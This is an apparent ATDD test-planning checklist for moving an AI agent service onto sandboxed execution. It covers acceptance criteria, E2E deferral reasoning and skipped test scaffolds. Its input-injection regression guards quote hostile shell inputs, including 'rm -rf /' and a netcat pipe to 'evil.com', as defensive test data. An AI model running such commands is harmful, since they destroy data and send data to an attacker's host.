---
stepsCompleted:
  - step-01-preflight-and-context
  - step-02-generation-mode
  - step-03-test-strategy
  - step-04-generate-tests
  - step-04c-aggregate
  - step-05-validate-and-complete
lastStep: step-05-validate-and-complete
lastSaved: '2026-07-16'
workflowType: testarch-atdd
storyId: '6.3'
storyKey: '6-3-migrate-agentservice-to-sandbox-execution'
storyFile: '_bmad-output/implementation-artifacts/6-3-migrate-agentservice-to-sandbox-execution.md'
atddChecklistPath: '_bmad-output/test-artifacts/atdd-checklist-6-3-migrate-agentservice-to-sandbox-execution.md'
generatedTestFiles:
  - 'apps/agent-be/src/streaming/agui-event-bridge.service.spec.ts'
  - 'apps/agent-be/src/streaming/agent.service.unit.spec.ts'
inputDocuments:
  - '_bmad-output/implementation-artifacts/6-3-migrate-agentservice-to-sandbox-execution.md'
  - '_bmad-output/project-context.md'
  - '_bmad-output/decision-policy.md'
  - 'apps/agent-be/src/streaming/agent.service.ts'
  - 'apps/agent-be/src/streaming/agui-event-bridge.service.ts'
  - 'apps/agent-be/src/streaming/agent.service.unit.spec.ts'
  - 'apps/agent-be/src/streaming/agent.service.spec.ts'
  - 'apps/agent-be/src/streaming/agui-event-bridge.service.spec.ts'
  - 'apps/agent-be/src/streaming/streaming.module.ts'
  - 'apps/agent-be/src/streaming/session-events.service.ts'
  - 'apps/agent-be/src/sandbox/sandbox.service.session.spec.ts'
  - 'apps/agent-be/src/sandbox/sandbox.service.nfr-s1.spec.ts'
  - 'apps/agent-be/test/helpers/sandbox-service.fake.ts'
  - 'apps/agent-be/test/helpers/agent-service.fake.ts'
  - 'apps/agent-be/test/helpers/mock-query.ts'
  - 'libs/shared-types/src/agent.interface.ts'
  - 'libs/shared-types/src/sandbox.interface.ts'
---

# ATDD Checklist - Epic 6, Story 6.3: Migrate AgentService to Sandbox-Based Execution

**Date:** 2026-07-16
**Author:** Marius
**Primary Test Level:** Unit (split by service — event bridge onEvent + agent service rewrite)

---

## Story Summary

As a developer on the bmad-easy team, I want `AgentService.runTurn()` to launch the agent inside the Daytona sandbox via sandbox-agent instead of the host-based SDK `query()`, so that the agent has direct filesystem access to the cloned repository and can read files, run git commands, and modify the working tree.

---

## Acceptance Criteria

1. **AC-1: `runTurn()` launches sandbox-agent inside the sandbox.** `runTurn()` launches sandbox-agent inside the sandbox via the Daytona process session API and streams output via `agui-event-bridge.service.ts`. The agent has direct filesystem access to the cloned repository inside the sandbox.
2. **AC-2: Agent cannot access host filesystem.** The agent cannot access the host filesystem. Platform-internal credentials are never injected into the sandbox — only `ANTHROPIC_API_KEY` and `GITHUB_TOKEN` are injected via `daytona.create()` envVars.
3. **AC-3: `stop()` terminates the real sandbox process.** `stop()` terminates the agent process inside the sandbox via `sandboxService.terminateAgentSession()`. The SSE channel emits `RUN_FINISHED`.
4. **AC-4: Host-based SDK code removed.** The `@anthropic-ai/claude-agent-sdk` import is removed from `AgentService`, `AGENT_WORKDIR` env var is removed, and the `cwd: process.env.AGENT_WORKDIR ?? tmpdir()` logic is removed.
5. **AC-5: `AgentServiceFake` updated.** The fake is updated to reflect the new execution mechanism's side effects.
6. **AC-6: Circuit breaker adapted.** Stopping the agent calls `aguiEventBridgeService.stop(conversationId)`. The timer-based stall detection remains the same; only the termination mechanism changes. The `query.interrupt()` call is removed.
7. **AC-7: Preserved behaviors remain functional.** The SSE event pipeline, AG-UI event types, tool-pill classifier, cost tracking, pending classifier promises pattern, and working-tree emission continue to work.
8. **AC-8: Turn persistence and cost tracking still work.** Cost data is still captured and persisted via `CostTrackingService`. The assistant turn is still persisted to Postgres with `accumulatedText` and `segments`.

---

## Story Integration Metadata

- **Story ID:** `6.3`
- **Story Key:** `6-3-migrate-agentservice-to-sandbox-execution`
- **Story File:** `_bmad-output/implementation-artifacts/6-3-migrate-agentservice-to-sandbox-execution.md`
- **Checklist Path:** `_bmad-output/test-artifacts/atdd-checklist-6-3-migrate-agentservice-to-sandbox-execution.md`
- **Generated Test Files:**
  - `apps/agent-be/src/streaming/agui-event-bridge.service.spec.ts` (4 new skipped tests — onEvent callback behavior)
  - `apps/agent-be/src/streaming/agent.service.unit.spec.ts` (19 new skipped tests — rewritten runTurn/stop/onModuleDestroy + regression guards + AC-4 removal verification)

---

## E2E Deferral Analysis (Browser-Level Mock Verification)

Per user instruction: "Before deferring E2E coverage, verify no browser-level mock pattern can simulate the scenario — only defer if no mock covers the ACs, and record the check in the ATDD checklist."

### AC-1: runTurn() launches sandbox-agent inside the sandbox

**Can a browser-level mock simulate this?** No.

**Reasoning:** AC-1's core behavior is entirely backend-internal: `AgentService.runTurn()` calls `aguiEventBridgeService.streamAgentEvents()` which calls `sandboxService.createAgentSession()` → `sandbox.process.createSession()` + `executeSessionCommand(runAsync: true)` inside the Daytona sandbox. A browser-level mock cannot reach the Daytona sandbox API — the browser connects to `apps/agent-be` for REST+SSE, never to Daytona directly. The `onEvent` callback that accumulates state and triggers side effects is backend-internal processing.

**Coverage:** Unit tests (`agent.service.unit.spec.ts`, 10 tests — streamAgentEvents called with correct params, RUN_STARTED before stream, text accumulation, tool-call segments, classifier integration, cost capture, RUN_FINISHED emission, concurrent-turn guard, error rejection, AGENT_STOPPED sentinel).

**Decision (DP-5):** E2E deferred for AC-1. No browser-level mock covers the Daytona sandbox process session API or the onEvent state accumulation.

### AC-2: Agent cannot access host filesystem

**Can a browser-level mock simulate this?** No.

**Reasoning:** AC-2's core behavior is a security invariant: platform-internal credentials (`DATABASE_URL`, `AUTH_SECRET`, `DAYTONA_API_KEY`, source code) are never injected into the sandbox, and only `ANTHROPIC_API_KEY` and `GITHUB_TOKEN` are injected via `daytona.create()` envVars (Story 6.1). The command string passed to `streamAgentEvents` must not contain credentials or allow command injection from user-controlled input. A browser-level mock cannot verify what credentials are or are not injected into the sandbox environment — that's a backend/sandbox boundary property. The credential-isolation and input-injection invariants are verified by regression guard tests at the command construction call site.

**Coverage:** Unit tests (`agent.service.unit.spec.ts`, 4 regression guard tests — credential-isolation: no platform creds in command, no ANTHROPIC_API_KEY/GITHUB_TOKEN in command; input-injection: malicious message cannot inject shell commands, shell metacharacters safely quoted).

**Decision (DP-5):** E2E deferred for AC-2. No browser-level mock covers the sandbox env injection boundary or the command construction security invariants.

### AC-3: stop() terminates the real sandbox process

**Can a browser-level mock simulate this?** No.

**Reasoning:** AC-3's core behavior is `AgentService.stop()` calling `aguiEventBridgeService.stop(conversationId)` which calls `sandboxService.terminateAgentSession()` → `sandbox.process.deleteSession()`. A browser-level mock can observe the `RUN_FINISHED` SSE event arriving at the browser, but cannot verify that `deleteSession` was called on the Daytona API. The "stop emits RUN_FINISHED" behavior is verifiable at the unit level by spying on `aguiEventBridgeService.stop()` and `sessionEvents.emit()`.

**Coverage:** Unit tests (`agent.service.unit.spec.ts`, 2 tests — stop() calls aguiEventBridgeService.stop(), stop() emits RUN_FINISHED after bridge.stop()).

**Decision (DP-5):** E2E deferred for AC-3. No browser-level mock covers the Daytona `deleteSession` API call or the stop→RUN_FINISHED ordering.

### AC-4: Host-based SDK code removed

**Can a browser-level mock simulate this?** No.

**Reasoning:** AC-4's core behavior is the absence of host-based SDK code: the `@anthropic-ai/claude-agent-sdk` import, `AGENT_WORKDIR` env var, and `tmpdir()` cwd logic are removed from `agent.service.ts`. This is a source-code property, not a runtime behavior — a browser-level mock cannot verify which imports a source file has. The verification is a static source-file assertion (the test reads `agent.service.ts` and asserts the SDK import string is absent).

**Coverage:** Unit tests (`agent.service.unit.spec.ts`, 1 test — source file does not contain SDK import, tmpdir, or AGENT_WORKDIR).

**Decision (DP-5):** E2E deferred for AC-4. No browser-level mock covers source-file import absence.

### AC-5: AgentServiceFake updated

**Can a browser-level mock simulate this?** No.

**Reasoning:** AC-5's core behavior is that `AgentServiceFake` (test-only) reflects the new execution mechanism's side effects. This is a test-infrastructure property — a browser-level mock cannot verify the fake's side-effect fidelity. The story's Task 5.1 notes the fake already implements `IAgentService` and doesn't use the event bridge, so no change is needed unless integration tests assert on event bridge calls. The existing integration tests (`agent.service.spec.ts`) use the fake via `AGENT_SERVICE` token override and should be unaffected.

**Coverage:** Existing integration tests (`agent.service.spec.ts`) verify the fake still works. No new tests needed — the fake's interface (`runTurn`, `stop`, `isIdle`) is unchanged.

**Decision (DP-5):** E2E deferred for AC-5. No browser-level mock covers test-fake side-effect fidelity.

### AC-6: Circuit breaker adapted

**Can a browser-level mock simulate this?** No.

**Reasoning:** AC-6's core behavior is that `stop()` and `onModuleDestroy()` call `aguiEventBridgeService.stop(conversationId)` instead of `abortController.abort()` + `query.interrupt()`. The event bridge owns stall detection (`AGENT_STREAM_TIMEOUT_MS`). A browser-level mock cannot verify which termination mechanism the backend uses — it only sees the resulting SSE events. The `AGENT_STOPPED` sentinel rejection handling (skip `RUN_ERROR` on stop-initiated rejection) is a backend guard, not browser-observable.

**Coverage:** Unit tests (`agent.service.unit.spec.ts`, 3 tests — stop() calls bridge.stop(), stop() emits RUN_FINISHED, onModuleDestroy() calls bridge.stop() for active runs; 1 test — AGENT_STOPPED rejection skips RUN_ERROR).

**Decision (DP-5):** E2E deferred for AC-6. No browser-level mock covers the termination mechanism delegation or the AGENT_STOPPED sentinel.

### AC-7: Preserved behaviors remain functional

**Can a browser-level mock simulate this?** No.

**Reasoning:** AC-7's core behaviors are transport-agnostic: the SSE event pipeline, AG-UI event types, tool-pill classifier, cost tracking, pending classifier promises, and working-tree emission all consume AG-UI events regardless of where the agent runs. These are backend-internal processing pipelines. A browser-level mock can observe the resulting SSE events but cannot verify the internal processing (e.g., that the classifier was called with the correct `toolName`/`input` looked up from the segment, or that pending classifier promises are awaited before `RUN_FINISHED`).

**Coverage:** Unit tests (`agent.service.unit.spec.ts` — text accumulation, tool-call segments, classifier integration, concurrent-turn guard, RUN_FINISHED emission). The working-tree emission after file-modifying tool calls is covered by the existing tests (which the dev verifies still pass after the rewrite).

**Decision (DP-5):** E2E deferred for AC-7. No browser-level mock covers the internal processing pipelines.

### AC-8: Turn persistence and cost tracking still work

**Can a browser-level mock simulate this?** No.

**Reasoning:** AC-8's core behavior is that cost data is captured from the `RUN_FINISHED` event's `data` payload (via the `onEvent` callback) and persisted via `CostTrackingService`, and the assistant turn is persisted to Postgres with `accumulatedText` and `segments`. A browser-level mock cannot verify that cost data was extracted from the `RUN_FINISHED` payload or that `CostTrackingService.recordCost()` was called — these are backend-internal calls. The browser only sees the SSE events, not the DB writes or cost recording.

**Coverage:** Unit tests (`agent.service.unit.spec.ts`, 2 tests — cost captured from RUN_FINISHED data payload, cost recording before RUN_FINISHED emit ordering).

**Decision (DP-5):** E2E deferred for AC-8. No browser-level mock covers the cost data extraction from the RUN_FINISHED payload or the CostTrackingService DB write.

### E2E Deferral Summary

| AC | Browser-level mock covers? | E2E tests created? | Coverage level |
| --- | --- | --- | --- |
| AC-1 | No (Daytona sandbox process session API + onEvent state accumulation) | No (deferred, DP-5) | Unit |
| AC-2 | No (sandbox env injection boundary + command construction security) | No (deferred, DP-5) | Unit (regression guards) |
| AC-3 | No (Daytona deleteSession API + stop→RUN_FINISHED ordering) | No (deferred, DP-5) | Unit |
| AC-4 | No (source-file import absence) | No (deferred, DP-5) | Unit (static assertion) |
| AC-5 | No (test-fake side-effect fidelity) | No (deferred, DP-5) | Existing integration |
| AC-6 | No (termination mechanism delegation + AGENT_STOPPED sentinel) | No (deferred, DP-5) | Unit |
| AC-7 | No (internal processing pipelines) | No (deferred, DP-5) | Unit |
| AC-8 | No (cost data extraction + CostTrackingService DB write) | No (deferred, DP-5) | Unit |

---

## Regression Guard Template Check (External Commands with User-Controlled Input)

Per user instruction: "When creating regression guards for code that executes external commands with user-controlled input, apply a uniform guard template to every call site: exercise both credential-isolation invariants (no credentials leak via command arguments or environment variables) and input-injection invariants (malicious input is safely quoted and cannot alter the command's behavior)."

**Does Story 6.3 involve code that executes external commands with user-controlled input?** Yes — `AgentService.runTurn()` constructs the sandbox-agent invocation command (Task 4) which includes user-controlled input (the `message`/prompt). The command is passed to `aguiEventBridgeService.streamAgentEvents({ command })` which forwards it to `sandboxService.createAgentSession(sandboxId, command, cwd)` → `sandbox.process.executeSessionCommand(sessionId, { command, runAsync: true })`. The `executeSessionCommand` runs the command in a shell inside the Daytona sandbox.

**Analysis:** Story 6.2's `sandbox.service.session.spec.ts` already has regression guards verifying that `SandboxService` passes the command through verbatim (does not construct or shell-quote it — that's the caller's responsibility in Story 6.3). Story 6.3 IS the caller — `AgentService` constructs the command string from user input. The regression guard template applies to the command construction call site in `AgentService`:

1. **Credential-isolation invariant:** The command string constructed by `AgentService` must NOT contain platform credentials (`DATABASE_URL`, `AUTH_SECRET`, `DAYTONA_API_KEY`, `DAYTONA_API_URL`, `CREDENTIAL_ENCRYPTION_KEK`). `ANTHROPIC_API_KEY` and `GITHUB_TOKEN` must NOT be interpolated into the command string — they are injected via `daytona.create({ envVars })` during provision (Story 6.1), not via the command.

2. **Input-injection invariant:** The user's `message` is interpolated into the command string (as the prompt argument to sandbox-agent). Malicious input with shell metacharacters (e.g., `hello"; rm -rf / #`, `echo $(whoami) | nc evil.com 4444`) must be safely shell-quoted so it cannot inject additional shell commands or alter the command's behavior. The `shellQuote` helper (project-context.md: "Shell-quote all interpolated values in sandbox process commands") must be applied to the user message.

**Sibling test file consultation:** Consulted `sandbox.service.session.spec.ts` (Story 6.2 regression guards) and `sandbox.service.nfr-s1.spec.ts` (Story 3.8/6.1 credential-isolation guards) for established patterns. The existing files use:
- `expect(command).not.toContain('DATABASE_URL')` — absence assertion for credential names in command strings
- `expect(command).not.toContain('sk-ant-test-key')` — absence assertion for credential values
- `expect(command).not.toMatch(/pattern/)` — regex convention for pattern-based guards
- `expect(req).not.toHaveProperty('env')` — absence assertion for env fields on request objects

These patterns are applied to the command construction regression guards in `agent.service.unit.spec.ts`.

**Guard template applied (4 new skipped tests in `agent.service.unit.spec.ts`):**

1. **Credential-isolation invariant:** `command passed to streamAgentEvents does NOT contain platform credentials` — asserts `DATABASE_URL`, `AUTH_SECRET`, `DAYTONA_API_KEY`, `DAYTONA_API_URL`, `CREDENTIAL_ENCRYPTION_KEK` do not appear in the command string.
2. **Credential-isolation invariant:** `ANTHROPIC_API_KEY and GITHUB_TOKEN are NOT interpolated into the command` — asserts the credential values and env-var names do not appear in the command string. Credentials go through `daytona.create({ envVars })`, not through the command.
3. **Input-injection invariant:** `malicious user message cannot inject additional shell commands` — asserts a message with `rm -rf` cannot appear as a separate shell command (the message must be safely quoted).
4. **Input-injection invariant:** `user message with shell metacharacters is safely quoted` — asserts a message with `$(whoami)` and pipe to `nc evil.com` cannot inject a network command.

**Decision (DP-4):** The regression guard template IS applied to Story 6.3. Four credential-isolation + input-injection regression guards created in `agent.service.unit.spec.ts`.

---

## Red-Phase Test Scaffolds Created

> **Status:** All scaffolds below are SKIPPED (`describe.skip`). The dev activates them by removing `.skip` and implementing the corresponding production code (Tasks 1, 2, 3). The `onEvent` test seam is already applied (not skipped — active infrastructure).

### Unit Tests (4 tests) — EXISTING FILE

**File:** `apps/agent-be/src/streaming/agui-event-bridge.service.spec.ts`

#### describe.skip('[P0] Story 6.3 — onEvent callback (event observation mechanism)')

- **Test:** `[P0] onEvent is called BEFORE sessionEvents.emit() for non-lifecycle events when callback is provided`
  - **Status:** SKIPPED — onEvent branching logic not implemented in processAgentEvent()
  - **Verifies:** AC-1, AC-7 (onEvent called before emit for non-lifecycle events)

- **Test:** `[P0] lifecycle events (RUN_STARTED, RUN_FINISHED, RUN_ERROR) are passed to onEvent but NOT forwarded to sessionEvents.emit() when onEvent is provided`
  - **Status:** SKIPPED — lifecycle event ownership (skip emit) not implemented
  - **Verifies:** AC-1, AC-8 (lifecycle events passed to onEvent but not double-emitted; RUN_FINISHED cost data interceptable)

- **Test:** `[P0] lifecycle events still emit via sessionEvents.emit() when no onEvent callback is provided (backward compat)`
  - **Status:** SKIPPED — backward compat path not implemented (currently all events emit regardless)
  - **Verifies:** AC-1 (backward compat — Story 6.2 tests still pass without onEvent)

- **Test:** `[P0] non-lifecycle events still emit via sessionEvents.emit() when no onEvent callback is provided (backward compat)`
  - **Status:** SKIPPED — backward compat path not implemented
  - **Verifies:** AC-1 (backward compat — non-lifecycle events emit without onEvent)

### Unit Tests (19 tests) — EXISTING FILE

**File:** `apps/agent-be/src/streaming/agent.service.unit.spec.ts`

#### describe.skip('[P0] Story 6.3 — runTurn() uses AguiEventBridgeService (AC-1, AC-7)')

- **Test:** `[P0] runTurn calls aguiEventBridgeService.streamAgentEvents with conversationId, sandboxId, userId, and onEvent callback (AC-1)`
  - **Status:** SKIPPED — runTurn() still uses SDK query()
  - **Verifies:** AC-1 (streamAgentEvents called with correct params + onEvent)

- **Test:** `[P0] runTurn emits RUN_STARTED before calling streamAgentEvents (AC-1, lifecycle ownership)`
  - **Status:** SKIPPED — lifecycle ownership not implemented
  - **Verifies:** AC-1 (AgentService owns RUN_STARTED emission)

- **Test:** `[P0] onEvent accumulates text from TEXT_MESSAGE_CONTENT events (AC-1, AC-7)`
  - **Status:** SKIPPED — onEvent callback not wired
  - **Verifies:** AC-1, AC-7 (text accumulation via onEvent)

- **Test:** `[P0] onEvent builds tool_call segments from TOOL_CALL_START/ARGS/END/RESULT (AC-1, AC-7)`
  - **Status:** SKIPPED — onEvent callback not wired
  - **Verifies:** AC-1, AC-7 (tool-call segment building via onEvent)

- **Test:** `[P0] onEvent triggers classifier on TOOL_CALL_RESULT with toolName/input looked up from segment (AC-7)`
  - **Status:** SKIPPED — onEvent callback not wired
  - **Verifies:** AC-7 (classifier integration via onEvent, segment lookup by toolCallId)

- **Test:** `[P0] onEvent captures cost data from RUN_FINISHED data payload (AC-8)`
  - **Status:** SKIPPED — onEvent callback not wired
  - **Verifies:** AC-8 (cost capture from RUN_FINISHED data)

- **Test:** `[P0] cost recording happens BEFORE RUN_FINISHED is emitted to SSE (AC-8, event ordering)`
  - **Status:** SKIPPED — onEvent callback not wired
  - **Verifies:** AC-8 (cost recording before RUN_FINISHED emit)

- **Test:** `[P0] runTurn emits RUN_FINISHED after streamAgentEvents resolves (AC-1, lifecycle ownership)`
  - **Status:** SKIPPED — runTurn() still uses SDK query()
  - **Verifies:** AC-1 (AgentService owns RUN_FINISHED emission)

- **Test:** `[P0] concurrent-turn guard: second runTurn on in-flight conversationId is rejected silently (AC-7)`
  - **Status:** SKIPPED — runTurn() still uses SDK query()
  - **Verifies:** AC-7 (concurrent-turn guard preserved)

- **Test:** `[P0] streamAgentEvents rejection (non-AGENT_STOPPED) emits RUN_ERROR (AC-7)`
  - **Status:** SKIPPED — error handling not adapted
  - **Verifies:** AC-7 (non-stop errors emit RUN_ERROR)

- **Test:** `[P0] AGENT_STOPPED rejection skips RUN_ERROR — stop() handles RUN_FINISHED (AC-6)`
  - **Status:** SKIPPED — AGENT_STOPPED sentinel handling not implemented
  - **Verifies:** AC-6 (stop-initiated rejection skips RUN_ERROR)

#### describe.skip('[P0] Story 6.3 — stop() and onModuleDestroy() delegate to AguiEventBridgeService (AC-3, AC-6)')

- **Test:** `[P0] stop() calls aguiEventBridgeService.stop(conversationId) (AC-3)`
  - **Status:** SKIPPED — stop() still uses abortController + query.interrupt()
  - **Verifies:** AC-3 (stop delegates to event bridge)

- **Test:** `[P0] stop() emits RUN_FINISHED after aguiEventBridgeService.stop() (AC-3)`
  - **Status:** SKIPPED — stop() still uses abortController + query.interrupt()
  - **Verifies:** AC-3 (stop emits RUN_FINISHED)

- **Test:** `[P0] onModuleDestroy() calls aguiEventBridgeService.stop() for each active run (AC-6)`
  - **Status:** SKIPPED — onModuleDestroy() still uses abortController
  - **Verifies:** AC-6 (onModuleDestroy delegates to event bridge)

#### describe.skip('[P0] Story 6.3 AC-2 — Regression guards: credential-isolation + input-injection for command construction')

- **Test:** `[P0] command passed to streamAgentEvents does NOT contain platform credentials`
  - **Status:** SKIPPED — command construction not implemented (Task 4)
  - **Verifies:** AC-2 (credential-isolation: no platform creds in command)

- **Test:** `[P0] ANTHROPIC_API_KEY and GITHUB_TOKEN are NOT interpolated into the command (injected via sandbox env only)`
  - **Status:** SKIPPED — command construction not implemented (Task 4)
  - **Verifies:** AC-2 (credential-isolation: credentials go through envVars, not commands)

- **Test:** `[P0] malicious user message cannot inject additional shell commands into the sandbox-agent command`
  - **Status:** SKIPPED — command construction not implemented (Task 4)
  - **Verifies:** AC-2 (input-injection: malicious message safely quoted)

- **Test:** `[P0] user message with shell metacharacters is safely quoted in the command`
  - **Status:** SKIPPED — command construction not implemented (Task 4)
  - **Verifies:** AC-2 (input-injection: shell metacharacters safely quoted)

#### describe.skip('[P0] Story 6.3 AC-4 — Host-based SDK code removed')

- **Test:** `[P0] AgentService no longer imports query/Query/SDKMessage from @anthropic-ai/claude-agent-sdk`
  - **Status:** SKIPPED — SDK import still present
  - **Verifies:** AC-4 (SDK import, tmpdir, AGENT_WORKDIR removed from source)

---

## Test Seams Applied (Not Skipped — Active Infrastructure)

The following test infrastructure changes were applied as part of the red-phase scaffolding. These are working seams that the dev's implementation will exercise — they are NOT skipped tests.

### `apps/agent-be/src/streaming/agui-event-bridge.service.ts` — `onEvent` callback on `AguiEventBridgeParams`

- Added `onEvent?: (event: SseEvent) => void` to `AguiEventBridgeParams` interface
- Added `SseEvent` type import from `./session-events.service`
- **Purpose:** `AgentService` needs to observe AG-UI events as they stream from the event bridge — for text accumulation, segment building, classifier triggering, working-tree emission, and cost capture. The `onEvent` callback is the observation mechanism (DP-3: simplest option — no subscription, no replay issues, no circular dependencies). The callback is optional — the event bridge still works without it (backward compat for Story 6.2 tests). The dev implements the branching logic in `processAgentEvent()` (Task 1.1): call `onEvent` before `sessionEvents.emit()` for non-lifecycle events; for lifecycle events, call `onEvent` but skip `sessionEvents.emit()` (AgentService owns lifecycle emission).

---

## Data Factories Created

No new data factories created. Tests use inline AG-UI event fixtures (`SseEvent` objects) fed through the mocked `streamAgentEvents` → `onEvent` callback, replacing the old SDK `SDKMessage` fixture builders.

---

## Fixtures Created

No new fixtures created. Tests use inline AG-UI event sequences representing sandbox-agent's normalized output (TEXT_MESSAGE_CONTENT, TOOL_CALL_START/ARGS/END/RESULT, RUN_STARTED, RUN_FINISHED with cost data payload).

---

## Mock Requirements

No new external service mocks required. All tests use a mock `AguiEventBridgeService` (plain object with `streamAgentEvents` and `stop` jest mocks) that captures the `onEvent` callback from params and invokes it with AG-UI events. This replaces the old `jest.doMock('@anthropic-ai/claude-agent-sdk')` + `createMockQuery` / `makeQueryFromGenerator` pattern.

### Mock AguiEventBridgeService (AgentService Unit Tests)

**Pattern:** A plain object with `streamAgentEvents: jest.fn()` and `stop: jest.fn()`. The `streamAgentEvents` mock captures the `onEvent` callback from the params and invokes it with pre-configured AG-UI events before resolving. This lets tests drive the agent run through the same code path the real event bridge would (the `onEvent` callback), without needing the real `AguiEventBridgeService` or a Daytona sandbox.

**Notes:** The mock is constructed inline in each test (or via the `createMockEventBridge` helper). The `createAgentServiceWithBridge` helper constructs `AgentService` with the future 6-arg constructor (adding `AguiEventBridgeService`) using a cast — the dev removes the cast after updating the constructor (Task 2.2).

---

## Required data-testid Attributes

No new `data-testid` attributes required. Story 6.3 is entirely backend — no UI changes.

---

## Implementation Checklist

### Test: AguiEventBridgeService — onEvent callback (Task 1.1, 1.3)

**File:** `apps/agent-be/src/streaming/agui-event-bridge.service.spec.ts`

**Tasks to make these tests pass:**

- [ ] Remove `describe.skip()` from the onEvent callback describe block
- [ ] Implement onEvent branching logic in `processAgentEvent()` (Task 1.1): call `onEvent` before `sessionEvents.emit()` for non-lifecycle events; for lifecycle events, call `onEvent` but skip `sessionEvents.emit()`
- [ ] Add `LIFECYCLE_EVENTS` Set constant (`RUN_STARTED`, `RUN_FINISHED`, `RUN_ERROR`) (Task 1.1)
- [ ] Run test: `yarn nx test agent-be --testPathPattern="agui-event-bridge.service.spec"`
- [ ] ✅ Test passes (green phase)

### Test: AgentService — runTurn() rewrite (Task 2, 7.1)

**File:** `apps/agent-be/src/streaming/agent.service.unit.spec.ts`

**Tasks to make these tests pass:**

- [ ] Remove `describe.skip()` from the runTurn/stop/onModuleDestroy describe blocks
- [ ] Remove the obsolete SDK-based tests (the old describe blocks above — Task 7.1)
- [ ] Remove the cast in `createAgentServiceWithBridge` after updating the constructor (Task 2.2)
- [ ] Implement runTurn() rewrite (Task 2.3): call `streamAgentEvents` with `onEvent`, accumulate state, emit lifecycle events
- [ ] Implement stop() rewrite (Task 3.1): call `aguiEventBridgeService.stop()`
- [ ] Implement onModuleDestroy() rewrite (Task 3.2): call `aguiEventBridgeService.stop()` for active runs
- [ ] Implement AGENT_STOPPED sentinel handling in catch block (Task 2.3)
- [ ] Run test: `yarn nx test agent-be --testPathPattern="agent.service.unit.spec"`
- [ ] ✅ Test passes (green phase)

### Test: AgentService — regression guards (Task 4, AC-2)

**File:** `apps/agent-be/src/streaming/agent.service.unit.spec.ts`

**Tasks to make these tests pass:**

- [ ] Remove `describe.skip()` from the regression guards describe block
- [ ] Implement command construction (Task 4) with `shellQuote` on user input
- [ ] Verify no platform credentials are interpolated into the command
- [ ] Run test: `yarn nx test agent-be --testPathPattern="agent.service.unit.spec"`
- [ ] ✅ Test passes (green phase)

### Test: AgentService — AC-4 SDK removal (Task 2.1, 6)

**File:** `apps/agent-be/src/streaming/agent.service.unit.spec.ts`

**Tasks to make these tests pass:**

- [ ] Remove `describe.skip()` from the AC-4 describe block
- [ ] Remove `@anthropic-ai/claude-agent-sdk` import from `agent.service.ts` (Task 2.1)
- [ ] Remove `tmpdir` import and `AGENT_WORKDIR` usage (Task 2.1)
- [ ] Run test: `yarn nx test agent-be --testPathPattern="agent.service.unit.spec"`
- [ ] ✅ Test passes (green phase)

---

## Running Tests

```bash
# Run all agent-be unit tests
yarn nx test agent-be

# Run specific test files
yarn nx test agent-be --testPathPattern="agui-event-bridge.service.spec"
yarn nx test agent-be --testPathPattern="agent.service.unit.spec"

# Run all tests for this story (after activating scaffolds)
yarn nx test agent-be --testPathPattern="agui-event-bridge.service.spec|agent.service.unit.spec"

# Typecheck (verifies test fixtures compile against real types)
yarn nx run agent-be:typecheck
```

---

## Test Execution Results

### Initial Scaffold Verification (RED phase)

**Command:** `yarn nx test agent-be --testPathPattern="agui-event-bridge.service.spec|agent.service.unit.spec"`

**Results:**

```
Test Suites: 33 passed, 33 total
Tests:       23 skipped, 774 passed, 797 total
```

**Summary:**

- Total new skipped tests: 23 (4 event bridge onEvent + 19 agent service rewrite/regression/AC-4)
- All 774 existing tests pass (no regressions)
- Typecheck clean (`yarn nx run agent-be:typecheck`)
- Status: ✅ Red-phase scaffolding complete — all scaffolds skipped, existing tests green

---

## Story Task Amendments (Per User Instruction)

Per user instruction: "After applying TDD red-phase scaffolding (adding skipped test blocks to new or existing files, adding test seams, or creating stub files), update the story file's tasks to reflect what was already done — tasks that instruct the dev to create scaffolding that prepare-tests has already applied should be amended to instruct activation of the existing scaffolding instead, so the story does not contradict the codebase state."

The following story tasks have been amended to reflect that the red-phase scaffolding and test seams already exist:

### Task 1 — Amended (onEvent test seam already applied)

**Original Task 1.1:** Extend `AguiEventBridgeParams` with an optional `onEvent?: (event: SseEvent) => void` callback.

**Amended Task 1.1:** ACTIVATE existing test seam — the ATDD workflow already added `onEvent?: (event: SseEvent) => void` to `AguiEventBridgeParams` and the `SseEvent` type import. The dev implements the branching logic in `processAgentEvent()` (call `onEvent` before `sessionEvents.emit()` for non-lifecycle events; skip `sessionEvents.emit()` for lifecycle events when `onEvent` is provided). Add the `LIFECYCLE_EVENTS` Set constant.

**Original Task 1.3:** Update existing `agui-event-bridge.service.spec.ts` tests to verify onEvent behavior.

**Amended Task 1.3:** ACTIVATE existing skipped test blocks in `agui-event-bridge.service.spec.ts` — remove `describe.skip()` from the "onEvent callback (event observation mechanism)" block (4 tests). Confirm RED (onEvent not called / lifecycle not skipped), then implement to GREEN.

### Task 7 — Amended (test scaffolds already exist)

**Original Task 7.1:** Rewrite `agent.service.unit.spec.ts` — the existing tests mock `@anthropic-ai/claude-agent-sdk`'s `query()`. These tests must be rewritten to mock `AguiEventBridgeService.streamAgentEvents()` instead.

**Amended Task 7.1:** ACTIVATE existing skipped test blocks in `agent.service.unit.spec.ts` — remove `describe.skip()` from the Story 6.3 blocks (runTurn rewrite, stop/onModuleDestroy, regression guards, AC-4 removal). Remove the obsolete SDK-based test blocks (the old describe blocks that mock `query()` via `jest.doMock`). Remove the cast in `createAgentServiceWithBridge` after updating the constructor (Task 2.2). Confirm RED, then implement to GREEN.

**Original Task 7.3:** Add a test verifying `stop()` calls `aguiEventBridgeService.stop()` (AC-3).

**Amended Task 7.3:** ACTIVATE existing skipped test — "stop() calls aguiEventBridgeService.stop(conversationId)" already scaffolded in the "stop() and onModuleDestroy() delegate to AguiEventBridgeService" block.

**Original Task 7.4:** Add a test verifying `onModuleDestroy()` calls `aguiEventBridgeService.stop()` for active runs (AC-6).

**Amended Task 7.4:** ACTIVATE existing skipped test — "onModuleDestroy() calls aguiEventBridgeService.stop() for each active run" already scaffolded in the same block.

### Task 4 — Amended (regression guard scaffolds already exist)

**Original Task 4.1:** Determine the sandbox-agent CLI invocation that produces JSONL-on-stdout.

**Amended Task 4.1:** UNCHANGED — the command string is the one piece that can only be fully validated against a real sandbox. However, the regression guard tests for command construction (credential-isolation + input-injection) are already scaffolded (skipped) in `agent.service.unit.spec.ts`. The dev activates them after implementing the command construction with `shellQuote` on user input.

---

## Notes

- **No E2E tests created** — all ACs have backend-internal core behaviors (Daytona sandbox process session API, onEvent state accumulation, command construction security, source-file import absence, AGENT_STOPPED sentinel) that cannot be simulated by browser-level mocks. See E2E Deferral Analysis above.
